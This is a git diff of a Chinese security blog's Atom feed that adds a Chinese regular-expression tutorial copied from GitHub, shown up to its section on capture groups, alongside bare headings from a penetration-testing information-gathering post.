@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-20T14:24:36+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">渗透测试之信息收集</title><link href="http://localhost:4000/2018/08/20/collect_mes/" rel="alternate" type="text/html" title="渗透测试之信息收集" /><published>2018-08-20T00:00:00+08:00</published><updated>2018-08-20T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/20/collect_mes</id><content type="html" xml:base="http://localhost:4000/2018/08/20/collect_mes/">&lt;p&gt;《Web 安全攻防》渗透测试之信息收集&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-20T16:01:52+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">渗透测试之信息收集</title><link href="http://localhost:4000/2018/08/20/collect_mes/" rel="alternate" type="text/html" title="渗透测试之信息收集" /><published>2018-08-20T00:00:00+08:00</published><updated>2018-08-20T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/20/collect_mes</id><content type="html" xml:base="http://localhost:4000/2018/08/20/collect_mes/">&lt;p&gt;《Web 安全攻防》渗透测试之信息收集&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -501,7 +501,664 @@ II &lt;a href=&quot;http://www.tianyancha.com&quot;&gt;天眼查 &lt;/a&gt;&lt;b
 &lt;h2 id=&quot;8社会工程学&quot;&gt;8.社会工程学&lt;/h2&gt;
 
 &lt;p&gt;&lt;strong&gt;社工库&lt;/strong&gt;&lt;br /&gt;
-&lt;strong&gt;域劫持&lt;/strong&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="信息收集" /><summary type="html">《Web 安全攻防》渗透测试之信息收集</summary></entry><entry><title type="html">wechall writeup</title><link href="http://localhost:4000/2018/08/19/wechall/" rel="alternate" type="text/html" title="wechall writeup" /><published>2018-08-19T00:00:00+08:00</published><updated>2018-08-19T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/19/wechall</id><content type="html" xml:base="http://localhost:4000/2018/08/19/wechall/">&lt;p&gt;国外的一个 CTF 网站，挺多人做这个的，这篇就记录 wechall 上题目的 writeup，持续更新……&lt;/p&gt;
+&lt;strong&gt;域劫持&lt;/strong&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="信息收集" /><summary type="html">《Web 安全攻防》渗透测试之信息收集</summary></entry><entry><title type="html">正则表达式基础(来自 github)</title><link href="http://localhost:4000/2018/08/20/regex/" rel="alternate" type="text/html" title="正则表达式基础(来自 github)" /><published>2018-08-20T00:00:00+08:00</published><updated>2018-08-20T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/20/regex</id><content type="html" xml:base="http://localhost:4000/2018/08/20/regex/">&lt;p&gt;来自 github 上的正则表达式基础，特别好，一定要搞熟。&lt;a href=&quot;https://github.com/zeeshanu/learn-regex/blob/master/README-cn.md&quot;&gt;原文链接&lt;/a&gt;&lt;br /&gt;
+还有一篇&lt;a href=&quot;https://deerchao.net/tutorials/regex/regex.htm&quot;&gt;正则表达式30分钟入门教程&lt;/a&gt;&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;https://i.imgur.com/bYwl7Vf.png&quot; alt=&quot;Learn Regex&quot; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;翻译&quot;&gt;翻译:&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;README.md&quot;&gt;English&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;README-es.md&quot;&gt;Español&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;README-fr.md&quot;&gt;Français&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;README-cn.md&quot;&gt;中文版&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;README-ja.md&quot;&gt;日本語&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;README-ko.md&quot;&gt;한국어&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;README-tr.md&quot;&gt;Turkish&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;README-gr.md&quot;&gt;Greek&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;README-hu.md&quot;&gt;Magyar&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;README-pl.md&quot;&gt;Polish&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;什么是正则表达式&quot;&gt;什么是正则表达式?&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;正则表达式是一组由字母和符号组成的特殊文本, 它可以用来从文本中找出满足你想要的格式的句子.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;一个正则表达式是在一个主体字符串中从左到右匹配字符串时的一种样式.
+“Regular expression”这个词比较拗口, 我们常使用缩写的术语”regex”或”regexp”.
+正则表达式可以从一个基础字符串中根据一定的匹配模式替换文本中的字符串、验证表单、提取字符串等等.&lt;/p&gt;
+
+&lt;p&gt;想象你正在写一个应用, 然后你想设定一个用户命名的规则, 让用户名包含字符,数字,下划线和连字符,以及限制字符的个数,好让名字看起来没那么丑.
+我们使用以下正则表达式来验证一个用户名:&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;
+  &lt;img src=&quot;http://localhost:4000/images/blog/regexp-cn.png&quot; alt=&quot;Regular expression&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;以上的正则表达式可以接受 &lt;code class=&quot;highlighter-rouge&quot;&gt;john_doe&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;jo-hn_doe&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;john12_as&lt;/code&gt;.
+但不匹配&lt;code class=&quot;highlighter-rouge&quot;&gt;Jo&lt;/code&gt;, 因为它包含了大写的字母而且太短了.&lt;/p&gt;
+
+&lt;h1 id=&quot;目录&quot;&gt;目录&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#1-基本匹配&quot;&gt;1. 基本匹配&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#2-元字符&quot;&gt;2. 元字符&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#21-点运算符-&quot;&gt;2.1 点运算符&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#22-字符集&quot;&gt;2.2 字符集&lt;/a&gt;
+        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#221-否定字符集&quot;&gt;2.2.1 否定字符集&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#23-重复次数&quot;&gt;2.3 重复次数&lt;/a&gt;
+        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#231--号&quot;&gt;2.3.1 * 号&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#232--号&quot;&gt;2.3.2   号&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#233--号&quot;&gt;2.3.3 ? 号&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#24--号&quot;&gt;2.4 {} 号&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#25--特征标群&quot;&gt;2.5 (…) 特征标群&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#26--或运算符&quot;&gt;2.6 | 或运算符&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#27-转码特殊字符&quot;&gt;2.7 转码特殊字符&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#28-锚点&quot;&gt;2.8 锚点&lt;/a&gt;
+        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#281--号&quot;&gt;2.8.1 ^ 号&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#282--号&quot;&gt;2.8.2 $ 号&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#3-简写字符集&quot;&gt;3. 简写字符集&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#4-前后关联约束前后预查&quot;&gt;4. 前后关联约束(前后预查)&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#41--前置约束存在&quot;&gt;4.1 ?=… 前置约束(存在)&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#42--前置约束-排除&quot;&gt;4.2 ?!… 前置约束-排除&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#43---后置约束-存在&quot;&gt;4.3 ?&amp;lt;= … 后置约束-存在&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#44--后置约束-排除&quot;&gt;4.4 ?&amp;lt;!… 后置约束-排除&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#5-标志&quot;&gt;5. 标志&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#51-忽略大小写-case-insensitive&quot;&gt;5.1 忽略大小写 (Case Insensitive)&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#52-全局搜索-global-search&quot;&gt;5.2 全局搜索 (Global search)&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#53-多行修饰符-multiline&quot;&gt;5.3 多行修饰符 (Multiline)&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#额外补充&quot;&gt;额外补充&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#贡献&quot;&gt;贡献&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#许可证&quot;&gt;许可证&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;1-基本匹配&quot;&gt;1. 基本匹配&lt;/h2&gt;
+
+&lt;p&gt;正则表达式其实就是在执行搜索时的格式, 它由一些字母和数字组合而成.
+例如: 一个正则表达式 &lt;code class=&quot;highlighter-rouge&quot;&gt;the&lt;/code&gt;, 它表示一个规则: 由字母&lt;code class=&quot;highlighter-rouge&quot;&gt;t&lt;/code&gt;开始,接着是&lt;code class=&quot;highlighter-rouge&quot;&gt;h&lt;/code&gt;,再接着是&lt;code class=&quot;highlighter-rouge&quot;&gt;e&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;the&quot; =&amp;gt; The fat cat sat on &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;the&lt;/strong&gt;&lt;/a&gt; mat.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/dmRygT/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正则表达式&lt;code class=&quot;highlighter-rouge&quot;&gt;123&lt;/code&gt;匹配字符串&lt;code class=&quot;highlighter-rouge&quot;&gt;123&lt;/code&gt;. 它逐个字符的与输入的正则表达式做比较.&lt;/p&gt;
+
+&lt;p&gt;正则表达式是大小写敏感的, 所以&lt;code class=&quot;highlighter-rouge&quot;&gt;The&lt;/code&gt;不会匹配&lt;code class=&quot;highlighter-rouge&quot;&gt;the&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;The&quot; =&amp;gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;The&lt;/strong&gt;&lt;/a&gt; fat cat sat on the mat.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/1paXsy/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;2-元字符&quot;&gt;2. 元字符&lt;/h2&gt;
+
+&lt;p&gt;正则表达式主要依赖于元字符.
+元字符不代表他们本身的字面意思, 他们都有特殊的含义. 一些元字符写在方括号中的时候有一些特殊的意思. 以下是一些元字符的介绍:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;元字符&lt;/th&gt;
+      &lt;th&gt;描述&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;.&lt;/td&gt;
+      &lt;td&gt;句号匹配任意单个字符除了换行符.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;[ ]&lt;/td&gt;
+      &lt;td&gt;字符种类. 匹配方括号内的任意字符.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;[^ ]&lt;/td&gt;
+      &lt;td&gt;否定的字符种类. 匹配除了方括号里的任意字符&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;*&lt;/td&gt;
+      &lt;td&gt;匹配&amp;gt;=0个重复的在*号之前的字符.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;+&lt;/td&gt;
+      &lt;td&gt;匹配&amp;gt;=1个重复的+号前的字符.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;?&lt;/td&gt;
+      &lt;td&gt;标记?之前的字符为可选.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;{n,m}&lt;/td&gt;
+      &lt;td&gt;匹配num个大括号之前的字符 (n &amp;lt;= num &amp;lt;= m).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;(xyz)&lt;/td&gt;
+      &lt;td&gt;字符集, 匹配与 xyz 完全相等的字符串.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;|&lt;/td&gt;
+      &lt;td&gt;或运算符,匹配符号前或后的字符.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;\&lt;/td&gt;
+      &lt;td&gt;转义字符,用于匹配一些保留的字符 &lt;code&gt;[ ] ( ) { } . * + ? ^ $ \ &amp;#124;&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;^&lt;/td&gt;
+      &lt;td&gt;从开始行开始匹配.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;$&lt;/td&gt;
+      &lt;td&gt;从末端开始匹配.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;21-点运算符-&quot;&gt;2.1 点运算符 &lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt;&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt;是元字符中最简单的例子.
+&lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt;匹配任意单个字符, 但不匹配换行符.
+例如, 表达式&lt;code class=&quot;highlighter-rouge&quot;&gt;.ar&lt;/code&gt;匹配一个任意字符后面跟着是&lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;r&lt;/code&gt;的字符串.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;.ar&quot; =&amp;gt; The &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;car&lt;/strong&gt;&lt;/a&gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;par&lt;/strong&gt;&lt;/a&gt;ked in the &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;gar&lt;/strong&gt;&lt;/a&gt;age.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/xc9GkU/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;22-字符集&quot;&gt;2.2 字符集&lt;/h2&gt;
+
+&lt;p&gt;字符集也叫做字符类.
+方括号用来指定一个字符集.
+在方括号中使用连字符来指定字符集的范围.
+在方括号中的字符集不关心顺序.
+例如, 表达式&lt;code class=&quot;highlighter-rouge&quot;&gt;[Tt]he&lt;/code&gt; 匹配 &lt;code class=&quot;highlighter-rouge&quot;&gt;the&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;The&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;[Tt]he&quot; =&amp;gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;The&lt;/strong&gt;&lt;/a&gt; car parked in &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;the&lt;/strong&gt;&lt;/a&gt; garage.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/2ITLQ4/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;方括号的句号就表示句号.
+表达式 &lt;code class=&quot;highlighter-rouge&quot;&gt;ar[.]&lt;/code&gt; 匹配 &lt;code class=&quot;highlighter-rouge&quot;&gt;ar.&lt;/code&gt;字符串&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;ar[.]&quot; =&amp;gt; A garage is a good place to park a c&lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;ar.&lt;/strong&gt;&lt;/a&gt;
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/wL3xtE/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;221-否定字符集&quot;&gt;2.2.1 否定字符集&lt;/h3&gt;
+
+&lt;p&gt;一般来说 &lt;code class=&quot;highlighter-rouge&quot;&gt;^&lt;/code&gt; 表示一个字符串的开头, 但它用在一个方括号的开头的时候, 它表示这个字符集是否定的.
+例如, 表达式&lt;code class=&quot;highlighter-rouge&quot;&gt;[^c]ar&lt;/code&gt; 匹配一个后面跟着&lt;code class=&quot;highlighter-rouge&quot;&gt;ar&lt;/code&gt;的除了&lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt;的任意字符.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;[^c]ar&quot; =&amp;gt; The car &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;par&lt;/strong&gt;&lt;/a&gt;ked in the &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;gar&lt;/strong&gt;&lt;/a&gt;age.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/nNNlq3/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;23-重复次数&quot;&gt;2.3 重复次数&lt;/h2&gt;
+
+&lt;p&gt;后面跟着元字符 &lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;?&lt;/code&gt; 的, 用来指定匹配子模式的次数.
+这些元字符在不同的情况下有着不同的意思.&lt;/p&gt;
+
+&lt;h3 id=&quot;231--号&quot;&gt;2.3.1 &lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt; 号&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;号匹配 在&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;之前的字符出现&lt;code class=&quot;highlighter-rouge&quot;&gt;大于等于0&lt;/code&gt;次.
+例如, 表达式 &lt;code class=&quot;highlighter-rouge&quot;&gt;a*&lt;/code&gt; 匹配以0或更多个a开头的字符, 因为有0个这个条件, 其实也就匹配了所有的字符. 表达式&lt;code class=&quot;highlighter-rouge&quot;&gt;[a-z]*&lt;/code&gt; 匹配一个行中所有以小写字母开头的字符串.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;[a-z]*&quot; =&amp;gt; T&lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;he&lt;/strong&gt;&lt;/a&gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;car&lt;/strong&gt;&lt;/a&gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;parked&lt;/strong&gt;&lt;/a&gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;in&lt;/strong&gt;&lt;/a&gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;the&lt;/strong&gt;&lt;/a&gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;garage&lt;/strong&gt;&lt;/a&gt; #21.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/7m8me5/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;字符和&lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt;字符搭配可以匹配所有的字符&lt;code class=&quot;highlighter-rouge&quot;&gt;.*&lt;/code&gt;.
+&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;和表示匹配空格的符号&lt;code class=&quot;highlighter-rouge&quot;&gt;\s&lt;/code&gt;连起来用, 如表达式&lt;code class=&quot;highlighter-rouge&quot;&gt;\s*cat\s*&lt;/code&gt;匹配0或更多个空格开头和0或更多个空格结尾的cat字符串.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;\s*cat\s*&quot; =&amp;gt; The fat&lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt; cat &lt;/strong&gt;&lt;/a&gt;sat on the &lt;a href=&quot;#learn-regex&quot;&gt;con&lt;strong&gt;cat&lt;/strong&gt;enation&lt;/a&gt;.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/gGrwuz/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;232--号&quot;&gt;2.3.2 &lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt; 号&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt;号匹配&lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt;号之前的字符出现 &amp;gt;=1 次.
+例如表达式&lt;code class=&quot;highlighter-rouge&quot;&gt;c.+t&lt;/code&gt; 匹配以首字母&lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt;开头以&lt;code class=&quot;highlighter-rouge&quot;&gt;t&lt;/code&gt;结尾,中间跟着任意个字符的字符串.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;c.+t&quot; =&amp;gt; The fat &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;cat sat on the mat&lt;/strong&gt;&lt;/a&gt;.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/Dzf9Aa/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;233--号&quot;&gt;2.3.3 &lt;code class=&quot;highlighter-rouge&quot;&gt;?&lt;/code&gt; 号&lt;/h3&gt;
+
+&lt;p&gt;在正则表达式中元字符 &lt;code class=&quot;highlighter-rouge&quot;&gt;?&lt;/code&gt; 标记在符号前面的字符为可选, 即出现 0 或 1 次.
+例如, 表达式 &lt;code class=&quot;highlighter-rouge&quot;&gt;[T]?he&lt;/code&gt; 匹配字符串 &lt;code class=&quot;highlighter-rouge&quot;&gt;he&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;The&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;[T]he&quot; =&amp;gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;The&lt;/strong&gt;&lt;/a&gt; car is parked in the garage.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/cIg9zm/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;[T]?he&quot; =&amp;gt; &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;The&lt;/strong&gt;&lt;/a&gt; car is parked in t&lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;he&lt;/strong&gt;&lt;/a&gt; garage.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/kPpO2x/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;24--号&quot;&gt;2.4 &lt;code class=&quot;highlighter-rouge&quot;&gt;{}&lt;/code&gt; 号&lt;/h2&gt;
+
+&lt;p&gt;在正则表达式中 &lt;code class=&quot;highlighter-rouge&quot;&gt;{}&lt;/code&gt; 是一个量词, 常用来一个或一组字符可以重复出现的次数.
+例如,  表达式 &lt;code class=&quot;highlighter-rouge&quot;&gt;[0-9]{2,3}&lt;/code&gt; 匹配最少 2 位最多 3 位 0~9 的数字.&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;[0-9]{2,3}&quot; =&amp;gt; The number was 9.&lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;999&lt;/strong&gt;&lt;/a&gt;7 but we rounded it off to &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;10&lt;/strong&gt;&lt;/a&gt;.0.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/juM86s/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;我们可以省略第二个参数.
+例如, &lt;code class=&quot;highlighter-rouge&quot;&gt;[0-9]{2,}&lt;/code&gt; 匹配至少两位 0~9 的数字.&lt;/p&gt;
+
+&lt;p&gt;如果逗号也省略掉则表示重复固定的次数.
+例如, &lt;code class=&quot;highlighter-rouge&quot;&gt;[0-9]{3}&lt;/code&gt; 匹配3位数字&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;[0-9]{2,}&quot; =&amp;gt; The number was 9.&lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;9997&lt;/strong&gt;&lt;/a&gt; but we rounded it off to &lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;10&lt;/strong&gt;&lt;/a&gt;.0.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/Gdy4w5/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;
+&quot;[0-9]{3}&quot; =&amp;gt; The number was 9.&lt;a href=&quot;#learn-regex&quot;&gt;&lt;strong&gt;999&lt;/strong&gt;&lt;/a&gt;7 but we rounded it off to 10.0.
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://regex101.com/r/Sivu30/1&quot;&gt;在线练习&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;25--特征标群&quot;&gt;2.5 &lt;code class=&quot;highlighter-rouge&quot;&gt;(...)&lt;/code&gt; 特征标群&lt;/h2&gt;
+
